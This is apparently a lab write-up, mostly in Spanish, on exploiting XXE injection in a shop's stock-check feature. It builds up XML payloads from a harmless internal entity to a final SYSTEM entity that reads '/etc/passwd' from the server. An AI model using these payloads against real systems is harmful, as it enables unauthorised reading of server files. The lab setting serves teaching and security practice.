# Lab: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.

![Practitioner](https://img.shields.io/badge/level-Apprentice-green) 

---


Iniciamos el laboratorio y nos encontramos con una aplicación de shopping:
![image](https://github.com/user-attachments/assets/56a61334-623e-4cfa-bd40-0b25b4550af0)

Accedemos a la descripción de un producto haciendo click en `View details`:
![image](https://github.com/user-attachments/assets/f8eae5bf-e647-4f4c-aff7-fb6974f55fee)

Este laboratorio nos dice que tiene una vulnerabilidad en la funcionalidad `Check stock`:
![image](https://github.com/user-attachments/assets/efc2f1da-39d8-411d-bcaa-bd09db8aa096)

Por lo que procedemos a analizarla:
![image](https://github.com/user-attachments/assets/e8f04b5b-299b-41ad-b709-99afa48379ff)

Esta captura muestra un escenario clásico y perfectamente explotable de XXE.

Estamos enviando información vía XML en la request:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
El servidor responde con 759, lo que indica que interpreta y procesa correctamente el XML enviado.

Indicios:
- El servidor está procesando directamente el contenido XML que el cliente envía, lo cual es el punto de partida para probar inyecciones de entidades externas.

- No hay evidencias de validación ni sanitización del XML.

- Si el servidor usa un parser vulnerable que permite entidades externas, podríamos intentar algo como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY test "test"> ]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

En este caso estamos definiendo un `DTD` que contiene una entidad interna `test` con el valor "test".
Aunque en este ejemplo **no estamos utilizando la entidad `&test;` dentro del XML**, esto **sirve como prueba inicial** para verificar si el servidor acepta la inclusión de un `DOCTYPE`. Esto puede revelar si:

- El parser XML está configurado para **procesar DTDs internos**.
- Existen **controles de seguridad que bloqueen la definición de entidades** (por ejemplo, filtros WAF).
- Se producen errores de parsing, lo cual podría indicar una **superficie vulnerable a ataques XXE**.

Analizamos la petición en Burp Suite:
![image](https://github.com/user-attachments/assets/7fc94c72-0b57-4523-b9d7-6c0dd8c46277)

El siguiente paso es confirmar si el servidor resuelve y expande entidades, por lo que referenciaremos la entidad:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY test "XXE Working"> ]>
<stockCheck>
  <productId>&test;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Analizamos el resultado de la petición:
![image](https://github.com/user-attachments/assets/c5251071-f42b-4d64-af51-4ffd3d1f77e5)



```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```



